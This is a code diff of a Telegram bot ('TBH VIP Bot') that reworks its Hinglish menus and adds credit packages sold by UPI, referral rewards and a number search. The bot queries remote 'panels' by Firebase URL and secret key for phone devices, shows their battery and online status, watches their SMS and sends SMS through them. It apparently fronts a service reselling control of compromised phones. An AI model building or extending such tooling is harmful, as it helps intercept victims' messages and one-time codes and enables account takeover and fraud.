-          { reply_markup: cancelKeyboard() }
+          `${em(E.search, "🔎")} <b>SEARCH NUMBER</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.globe, "🌐")} ALL PANELS CONNECTED. CURRENTLY <b>${totalOnline}</b> ONLINE NUMBERS LOADED.\n\n` +
+          `ENTER THE PHONE NUMBER YOU WANT TO SEARCH:\n` +
+          `Example: <code>9876543210</code>\n\n` +
+          `Tap ${em(E.back, "↩️")} <b>CANCEL</b> to go back.`,
+          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
         );
         return;
       }
 
-      if (text === "📋 REFER & EARN") {
-        const expiryStr = user.getNumberExpiresAt
-          ? `✅ ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m remaining`
-          : "❌ EXPIRED";
+      if (text === "🪙 REFER & EARN") {
+        const expiryStr = user.getNumberExpiresAt && user.getNumberExpiresAt > new Date()
+          ? `${em(E.check, "✅")} ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m remaining`
+          : `${em(E.offline, "🔴")} EXPIRED`;
 
         const webStatus = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date()
-          ? `✅ ACTIVE — ${Math.floor((user.webPanelExpiresAt.getTime() - Date.now()) / 3600000)}hr remaining`
-          : `🔒 LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals karo (${user.referralCount}/10) to unlock + 24HR access`;
+          ? `${em(E.check, "✅")} ACTIVE — ${Math.floor((user.webPanelExpiresAt.getTime() - Date.now()) / 3600000)}hr remaining`
+          : `${em(E.lock, "🔒")} LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals (${user.referralCount}/10)`;
 
         const sendStatus = user.sendSmsUnlocked
-          ? `✅ UNLOCKED — ${user.smsCredits} credits`
-          : `🔒 LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals karo (${user.referralCount}/10) to unlock + 500 credits`;
+          ? `${em(E.check, "✅")} UNLOCKED — ${user.smsCredits} credits`
+          : `${em(E.lock, "🔒")} LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals (${user.referralCount}/10)`;
 
         const referralLink = `https://t.me/${BOT_USERNAME}?start=${user.referralCode}`;
 
         await bot.sendMessage(
           chatId,
-          `🎁 REFERRAL SYSTEM\n\nAAPKA REFERRAL LINK:\n${referralLink}\n\nLink pe tap karke copy karo, ya Share button use karo.\n\n━━ AAPKE REFERRALS ━━\n👥 TOTAL REFERRALS: ${user.referralCount}\n\n━━ GET NUMBER ━━\n${expiryStr}\n\n━━ SEND SMS ━━\n${sendStatus}\n\n━━ WEB PANEL ━━\n${webStatus}\n\nLink doston ke saath share karo — har naya user jo isi link se join karega, uspe aapko EXTRA HOURS milega!\n\nRULES:\n• 1st referral = +12hr Get Number access\n• Har extra referral = +12hr (cumulative)\n• 10 referrals = Send SMS unlock + 500 SMS credits\n• Uske baad har referral = +100 SMS credits\n• 10 referrals = Web Panel unlock + 24HR access\n• Uske baad har referral = +12hr web access`,
-          { reply_markup: mainMenuKeyboard() }
+          `${em(E.referral, "👥")} <b>REFERRAL SYSTEM</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.link, "🔗")} <b>AAPKA REFERRAL LINK:</b>\n` +
+          `<code>${referralLink}</code>\n\n` +
+          `${divider()}\n` +
+          `${em(E.referral, "👥")} <b>TOTAL REFERRALS:</b> ${user.referralCount}\n\n` +
+          `${em(E.phone, "📱")} <b>GET NUMBER</b>\n${expiryStr}\n\n` +
+          `${em(E.signal, "📶")} <b>SEND SMS</b>\n${sendStatus}\n\n` +
+          `${em(E.panel, "🖥")} <b>WEB PANEL</b>\n${webStatus}\n\n` +
+          `${divider()}\n` +
+          `${em(E.crown, "👑")} <b>RULES:</b>\n` +
+          `• 1st referral = +12hr Get Number\n` +
+          `• Har referral = +12hr (cumulative)\n` +
+          `• 10 referrals = Send SMS unlock + 500 credits\n` +
+          `• 10 referrals = Web Panel unlock + 24hr access`,
+          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
         );
         return;
       }
@@ -462,8 +671,11 @@ function setupHandlers(bot: TelegramBot) {
         await db.update(botUsersTable).set({ state: "gift_card" }).where(eq(botUsersTable.id, user.id));
         await bot.sendMessage(
           chatId,
-          `🎁 GIFT CARD REDEEM\n\nApna gift code send karein (E.G. GIFT-AB3X7K):\n\nValid code redeem karne pe aapko Get Number access milega.`,
-          { reply_markup: cancelKeyboard() }
+          `${em(E.gift, "🎁")} <b>GIFT CARD REDEEM</b>\n` +
+          `${divider()}\n\n` +
+          `Apna gift code send karein:\nExample: <code>GIFT-AB3X7K</code>\n\n` +
+          `${em(E.check, "✅")} Valid code redeem karne pe aapko Get Number access milega.`,
+          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
         );
         return;
       }
@@ -472,8 +684,11 @@ function setupHandlers(bot: TelegramBot) {
         if (user.referralCount < 10) {
           await bot.sendMessage(
             chatId,
-            `🌐 WEB PANEL — LOCKED!\n\nWeb unlock karne ke liye ${10 - user.referralCount} REFERRALS AUR KARO!\n🔒 10 referrals complete karo to 24hr ke liye web unlock hoga.\n\n👥 AAPKE TOTAL REFERRALS: ${user.referralCount}\n✋ Refer button dabao aur apna link share karo.`,
-            { reply_markup: mainMenuKeyboard() }
+            `${em(E.panel, "🖥")} <b>WEB PANEL — LOCKED!</b>\n\n` +
+            `${em(E.lock, "🔒")} Web unlock karne ke liye <b>${10 - user.referralCount} REFERRALS AUR KARO!</b>\n\n` +
+            `${em(E.referral, "👥")} AAPKE TOTAL REFERRALS: ${user.referralCount}\n` +
+            `${em(E.coin, "🪙")} REFER KARO, EARN KARO!`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
           );
           return;
         }
@@ -482,8 +697,8 @@ function setupHandlers(bot: TelegramBot) {
         if (!hasWebAccess) {
           await bot.sendMessage(
             chatId,
-            `🌐 WEB PANEL — ACCESS EXPIRED!\n\nWeb panel access khatam ho gaya. Refer karo to extend karo.`,
-            { reply_markup: mainMenuKeyboard() }
+            `${em(E.panel, "🖥")} <b>WEB PANEL — ACCESS EXPIRED!</b>\n\nWeb panel access khatam ho gaya. Refer karo to extend karo.`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
           );
           return;
         }
@@ -494,8 +709,10 @@ function setupHandlers(bot: TelegramBot) {
 
         await bot.sendMessage(
           chatId,
-          `🌐 WEB PANEL ACCESS GRANTED!\n\nClick here to open:\n${webUrl}\n\nAccess expires: ${user.webPanelExpiresAt?.toLocaleString("en-IN")}`,
-          { reply_markup: mainMenuKeyboard() }
+          `${em(E.panel, "🖥")} <b>WEB PANEL ACCESS GRANTED!</b>\n\n` +
+          `${em(E.link, "🔗")} <a href="${webUrl}">Click here to open Web Panel</a>\n\n` +
+          `${em(E.timer, "⏱")} Access expires: ${user.webPanelExpiresAt?.toLocaleString("en-IN")}`,
+          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
         );
         return;
       }
@@ -504,8 +721,11 @@ function setupHandlers(bot: TelegramBot) {
         if (!user.sendSmsUnlocked) {
           await bot.sendMessage(
             chatId,
-            `🔒 SEND SMS LOCKED\n\nSMS bhejne ke liye 10 referrals complete karo.\nYahan tak: ${user.referralCount}/10\nAur ${10 - Math.min(user.referralCount, 10)} referrals karo to unlock + 500 SMS CREDITS milenge.\n\n✋ Refer & Earn button se apna link share karo.`,
-            { reply_markup: mainMenuKeyboard() }
+            `${em(E.lock, "🔒")} <b>SEND SMS LOCKED</b>\n\n` +
+            `SMS bhejne ke liye <b>10 referrals</b> complete karo.\n` +
+            `Abhi tak: ${user.referralCount}/10\n` +
+            `${em(E.coin, "🪙")} Refer & Earn button se link share karo.`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
           );
           return;
         }
@@ -513,130 +733,186 @@ function setupHandlers(bot: TelegramBot) {
         if (user.smsCredits <= 0) {
           await bot.sendMessage(
             chatId,
-            `📢 SEND SMS\n\nAapke paas 0 SMS credits hain.\nReferrals karo to credits earn karo (har referral = +100 credits).`,
-            { reply_markup: mainMenuKeyboard() }
+            `${em(E.signal, "📶")} <b>SEND SMS</b>\n\nAapke paas 0 SMS credits hain.\nReferrals karo to credits earn karo.`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
           );
           return;
         }
 
         await bot.sendMessage(
           chatId,
-          `📢 SEND SMS\n\nAapke paas ${user.smsCredits} SMS credits hain.\n\nFormat: NUMBER|MESSAGE\nExample: 9876543210|Hello, this is a test message\n\nCancel karne ke liye CANCEL dabao.`,
-          { reply_markup: cancelKeyboard() }
+          `${em(E.signal, "📶")} <b>SEND SMS</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.credits, "💎")} Aapke paas <b>${user.smsCredits}</b> SMS credits hain.\n\n` +
+          `Format: <code>NUMBER|MESSAGE</code>\nExample: <code>9876543210|Hello, test message</code>\n\n` +
+          `Tap ${em(E.back, "↩️")} <b>CANCEL</b> to go back.`,
+          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
         );
         await db.update(botUsersTable).set({ state: "send_sms" }).where(eq(botUsersTable.id, user.id));
         return;
       }
 
-      if (text === "🔴 BACK" || text === "🔴 CANCEL") {
-        // Stop any watch
-        const intervalId = watchIntervals.get(telegramId);
-        if (intervalId) {
-          clearInterval(intervalId);
-          watchIntervals.delete(telegramId);
-          watchLastSms.delete(telegramId);
-        }
-        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
+      if (text === "👤 PROFILE") {
+        const getNum = user.getNumberExpiresAt && user.getNumberExpiresAt > new Date()
+          ? `${em(E.check, "✅")} ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m`
+          : `${em(E.offline, "🔴")} EXPIRED`;
+
+        const webPanel = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date()
+          ? `${em(E.check, "✅")} ACTIVE`
+          : `${em(E.lock, "🔒")} LOCKED`;
+
+        const sendSms = user.sendSmsUnlocked
+          ? `${em(E.check, "✅")} UNLOCKED`
+          : `${em(E.lock, "🔒")} LOCKED`;
+
         await bot.sendMessage(
           chatId,
-          `🏠 MAIN MENU\n\nTap a button below 👇`,
-          { reply_markup: mainMenuKeyboard() }
+          `${em(E.profile, "👤")} <b>MY PROFILE</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.name, "📛")} <b>NAME</b>   : ${user.firstName}\n` +
+          `${em(E.id, "🆔")} <b>ID</b>     : ${user.telegramId}\n` +
+          `${em(E.joined, "📅")} <b>JOINED</b> : ${user.createdAt?.toLocaleDateString("en-IN") || "N/A"}\n` +
+          `${divider()}\n\n` +
+          `${em(E.phone, "📱")} <b>GET NUMBER</b> : ${getNum}\n` +
+          `${em(E.panel, "🖥")} <b>WEB PANEL</b>  : ${webPanel}\n` +
+          `${em(E.signal, "📶")} <b>SEND SMS</b>   : ${sendSms}\n` +
+          `${divider()}\n\n` +
+          `${em(E.referral, "👥")} <b>REFERRALS</b> : ${user.referralCount}\n` +
+          `${em(E.credits, "💎")} <b>CREDITS</b>   : ${user.smsCredits}`,
+          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
         );
         return;
       }
 
-      // ─── State-based inputs ───────────────────────────────────────────────
+      if (text === "💳 BUY CREDIT") {
+        await bot.sendMessage(
+          chatId,
+          `${em(E.buy, "💳")} <b>BUY CREDIT</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.money, "💰")} <b>PACKAGE SELECT KARO — UPI QR AUTO-GENERATE HOGA:</b>\n\n` +
+          `${em(E.lightning, "⚡")} 100 Credits — ₹49\n` +
+          `${em(E.lightning, "⚡")} 500 Credits — ₹199\n` +
+          `${em(E.lightning, "⚡")} 1000 Credits — ₹349\n` +
+          `${em(E.lightning, "⚡")} 5000 Credits — ₹999\n\n` +
+          `${em(E.history, "📋")} QR SCAN KARO → PAY KARO → SCREENSHOT DEVELOPER KO BHEJO.`,
+          {
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: "💳 100 Credits — ₹49",   callback_data: "buy_100" },
+                  { text: "💳 500 Credits — ₹199",  callback_data: "buy_500" },
+                ],
+                [
+                  { text: "💳 1000 Credits — ₹349", callback_data: "buy_1000" },
+                  { text: "💳 5000 Credits — ₹999", callback_data: "buy_5000" },
+                ],
+              ],
+            },
+          }
+        );
+        return;
+      }
+
+      if (text === "📋 SUPPORT ( DEVELOPER )") {
+        await bot.sendMessage(
+          chatId,
+          `${em(E.support, "🖥")} <b>SUPPORT ( DEVELOPER )</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.sparkle, "✨")} Kisi bhi issue ke liye developer se contact karo:\n\n` +
+          `${em(E.link, "🔗")} @TBH_BRAND`,
+          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
+        );
+        return;
+      }
+
+      if (text === "↩️ BACK" || text === "↩️ CANCEL") {
+        const iv = watchIntervals.get(telegramId);
+        if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
+        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
+        await bot.sendMessage(
+          chatId,
+          `${em(E.home, "🏠")} <b>MAIN MENU</b>`,
+          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
+        );
+        return;
+      }
+
+      // ── State-based text inputs ──────────────────────────────────────────
 
       if (user.state === "search_number") {
-        if (text === "🔴 CANCEL") {
-          await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
-          await bot.sendMessage(chatId, "🏠 MAIN MENU", { reply_markup: mainMenuKeyboard() });
-          return;
-        }
-
         const searchNum = text.replace(/\D/g, "");
         if (searchNum.length < 7) {
-          await bot.sendMessage(chatId, "Please enter a valid phone number (at least 7 digits).");
+          await bot.sendMessage(chatId, "Please enter a valid phone number (min 7 digits).");
           return;
         }
 
-        await bot.sendMessage(chatId, "🔎 Searching across all panels...");
+        await bot.sendMessage(chatId, `${em(E.search, "🔎")} <b>Searching...</b>`, { parse_mode: "HTML" });
 
         const panels = await db.select().from(panelsTable);
         let found = null;
         for (const panel of panels) {
           const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
-          const match = devices.find((d) => d.phoneNumber.replace(/\D/g, "").includes(searchNum));
-          if (match) {
-            found = match;
-            break;
-          }
+          const match   = devices.find((d) => d.phoneNumber.replace(/\D/g, "").includes(searchNum));
+          if (match) { found = match; break; }
         }
 
         if (found) {
           await bot.sendMessage(
             chatId,
-            `✅ NUMBER FOUND!\n\n📱 Phone: ${found.phoneNumber}\n📊 Panel: ${found.panelName}\n🔋 Battery: ${found.battery}\n🟢 Status: ${found.status ? "Online" : "Offline"}\n📅 Last Seen: ${found.lastSeen || "N/A"}`,
-            { reply_markup: mainMenuKeyboard() }
+            `${em(E.check, "✅")} <b>NUMBER FOUND!</b>\n${divider()}\n\n` +
+            `${em(E.phone, "📱")} <b>Phone:</b> ${found.phoneNumber}\n` +
+            `${em(E.db, "🗄")} <b>Panel:</b> ${found.panelName}\n` +
+            `${em(E.battery, "🔋")} <b>Battery:</b> ${found.battery}\n` +
+            `${em(E.online, "🟢")} <b>Status:</b> ${found.status ? "Online" : "Offline"}`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
           );
         } else {
-          await bot.sendMessage(chatId, `❌ Number ${text} not found in any panel.`, { reply_markup: mainMenuKeyboard() });
+          await bot.sendMessage(
+            chatId,
+            `${em(E.offline, "🔴")} <b>Number ${text} not found in any panel.</b>`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
+          );
         }
-
         await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
         return;
       }
 
       if (user.state === "gift_card") {
         const code = text.toUpperCase().trim();
-
         const [card] = await db
           .select()
           .from(giftCardsTable)
           .where(and(eq(giftCardsTable.code, code)));
 
         if (!card) {
-          await bot.sendMessage(chatId, "❌ Invalid gift code. Please try again.");
+          await bot.sendMessage(chatId, `${em(E.offline, "🔴")} <b>Invalid gift code.</b> Please try again.`, { parse_mode: "HTML" });
           return;
         }
-
         if (card.usedBy) {
-          await bot.sendMessage(chatId, "❌ This gift code has already been used.");
+          await bot.sendMessage(chatId, `${em(E.offline, "🔴")} <b>This code has already been used.</b>`, { parse_mode: "HTML" });
           return;
         }
 
-        // Redeem the card
-        const value = parseInt(card.value, 10);
+        const value      = parseInt(card.value, 10);
         let updateData: Partial<{ getNumberExpiresAt: Date; smsCredits: number }> = {};
 
         if (card.type === "hours") {
-          const now = new Date();
-          const currentExpiry = user.getNumberExpiresAt
-            ? new Date(Math.max(user.getNumberExpiresAt.getTime(), now.getTime()))
-            : now;
-          updateData.getNumberExpiresAt = new Date(currentExpiry.getTime() + value * 60 * 60 * 1000);
+          const now    = new Date();
+          const base   = user.getNumberExpiresAt ? new Date(Math.max(user.getNumberExpiresAt.getTime(), now.getTime())) : now;
+          updateData.getNumberExpiresAt = new Date(base.getTime() + value * 60 * 60 * 1000);
         } else if (card.type === "credits") {
           updateData.smsCredits = user.smsCredits + value;
         }
 
-        await db
-          .update(botUsersTable)
-          .set(updateData)
-          .where(eq(botUsersTable.id, user.id));
+        await db.update(botUsersTable).set(updateData).where(eq(botUsersTable.id, user.id));
+        await db.update(giftCardsTable).set({ usedBy: telegramId, usedAt: new Date() }).where(eq(giftCardsTable.id, card.id));
 
-        await db
-          .update(giftCardsTable)
-          .set({ usedBy: telegramId, usedAt: new Date() })
-          .where(eq(giftCardsTable.id, card.id));
-
-        const rewardMsg = card.type === "hours"
-          ? `+${value} hours Get Number access`
-          : `+${value} SMS credits`;
-
+        const rewardMsg = card.type === "hours" ? `+${value} hours Get Number access` : `+${value} SMS credits`;
         await bot.sendMessage(
           chatId,
-          `✅ Gift code redeemed successfully!\n\nReward: ${rewardMsg}`,
-          { reply_markup: mainMenuKeyboard() }
+          `${em(E.check, "✅")} <b>Gift code redeemed successfully!</b>\n\n${em(E.gift, "🎁")} Reward: <b>${rewardMsg}</b>`,
+          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
         );
         await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
         return;
@@ -644,16 +920,15 @@ function setupHandlers(bot: TelegramBot) {
 
       if (user.state === "send_sms") {
         if (text.includes("|")) {
-          const [num, ...msgParts] = text.split("|");
+          const [num, ...parts] = text.split("|");
           const phoneNum = num.trim().replace(/\D/g, "");
-          const message = msgParts.join("|").trim();
+          const message  = parts.join("|").trim();
 
           if (!phoneNum || !message) {
             await bot.sendMessage(chatId, "Invalid format. Use: NUMBER|MESSAGE");
             return;
           }
 
-          // Deduct 1 credit
           await db
             .update(botUsersTable)
             .set({ smsCredits: Math.max(0, user.smsCredits - 1), state: "main_menu" })
@@ -661,57 +936,105 @@ function setupHandlers(bot: TelegramBot) {
 
           await bot.sendMessage(
             chatId,
-            `✅ SMS queued!\n\nTo: ${phoneNum}\nMessage: ${message}\n\nCredits remaining: ${user.smsCredits - 1}`,
-            { reply_markup: mainMenuKeyboard() }
+            `${em(E.check, "✅")} <b>SMS QUEUED!</b>\n\n` +
+            `${em(E.phone, "📱")} <b>To:</b> ${phoneNum}\n` +
+            `${em(E.sms, "💬")} <b>Message:</b> ${message}\n\n` +
+            `${em(E.credits, "💎")} Credits remaining: ${user.smsCredits - 1}`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
           );
           return;
         }
+        await bot.sendMessage(chatId, "Format: NUMBER|MESSAGE\nExample: 9876543210|Hello");
+        return;
       }
 
-      // Default: show main menu
-      await bot.sendMessage(chatId, "🏠 MAIN MENU\n\nTap a button below 👇", { reply_markup: mainMenuKeyboard() });
+      // Default
+      await bot.sendMessage(
+        chatId,
+        `${em(E.home, "🏠")} <b>MAIN MENU</b>`,
+        { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
+      );
     } catch (err) {
       logger.error({ err, chatId }, "Bot message handler error");
-      try {
-        await bot.sendMessage(chatId, "Something went wrong. Please try again.");
-      } catch {}
+      try { await bot.sendMessage(chatId, "Something went wrong. Please try again."); } catch {}
     }
   });
 
-  // Callback query handler (inline keyboard)
+  // ── Callback query (inline buttons) ───────────────────────────────────────
   bot.on("callback_query", async (query) => {
     if (!query.message || !query.from) return;
-    const chatId = query.message.chat.id;
+    const chatId     = query.message.chat.id;
     const telegramId = String(query.from.id);
-    const data = query.data;
+    const data       = query.data || "";
 
     try {
       if (data === "check_joined") {
-        const [user] = await db
-          .select()
-          .from(botUsersTable)
-          .where(eq(botUsersTable.telegramId, telegramId));
+        let [user] = await db.select().from(botUsersTable).where(eq(botUsersTable.telegramId, telegramId));
 
         if (!user) {
-          // Create user without referral
           const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
-          await db.insert(botUsersTable).values({
+          const [newUser] = await db.insert(botUsersTable).values({
             telegramId,
-            username: query.from.username || null,
-            firstName: query.from.first_name || "User",
+            username:     query.from.username || null,
+            firstName:    query.from.first_name || "User",
             referralCode: generateReferralCode(telegramId),
-            referredBy: null,
+            referredBy:   null,
             getNumberExpiresAt: expiresAt,
-          });
+          }).returning();
+          user = newUser;
         }
 
-        await bot.answerCallbackQuery(query.id, { text: "Verified! Welcome to TBH VIP." });
+        await bot.answerCallbackQuery(query.id, { text: "✅ Verified! Welcome to TBH VIP Bot." });
+
+        // Show inline verified message then send main menu
         await bot.sendMessage(
           chatId,
-          `✅ VERIFIED! YOU JOINED ALL CHANNELS.\n\n🏠 MAIN MENU\n\nTap a button below 👇`,
-          { reply_markup: mainMenuKeyboard() }
+          `${em(E.check, "✅")} <b>VERIFIED — BOT READY</b>`,
+          {
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [[
+                { text: "✅ VERIFIED — BOT READY", callback_data: "noop" },
+              ]],
+            },
+          }
         );
+
+        await bot.sendMessage(
+          chatId,
+          `${em(E.lightning, "⚡")} <b>BOT READY! USE THE BUTTONS BELOW.</b>`,
+          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
+        );
+        return;
       }
+
+      if (data === "buy_100" || data === "buy_500" || data === "buy_1000" || data === "buy_5000") {
+        const packages: Record<string, { credits: number; price: number }> = {
+          buy_100:  { credits: 100,  price: 49 },
+          buy_500:  { credits: 500,  price: 199 },
+          buy_1000: { credits: 1000, price: 349 },
+          buy_5000: { credits: 5000, price: 999 },
+        };
+        const pkg = packages[data];
+        await bot.answerCallbackQuery(query.id, { text: `₹${pkg.price} ke liye UPI QR generate ho raha hai...` });
+        await bot.sendMessage(
+          chatId,
+          `${em(E.buy, "💳")} <b>PAYMENT DETAILS</b>\n${divider()}\n\n` +
+          `${em(E.credits, "💎")} <b>Package:</b> ${pkg.credits} Credits\n` +
+          `${em(E.money, "💰")} <b>Amount:</b> ₹${pkg.price}\n\n` +
+          `${em(E.warn, "⚠️")} UPI QR screenshot developer ko bhejo after payment:\n` +
+          `${em(E.link, "🔗")} @TBH_BRAND`,
+          { parse_mode: "HTML" }
+        );
+        return;
+      }
+
+      if (data === "noop") {
+        await bot.answerCallbackQuery(query.id);
+        return;
+      }
+
+      await bot.answerCallbackQuery(query.id);
     } catch (err) {
       logger.error({ err }, "Callback query error");
     }
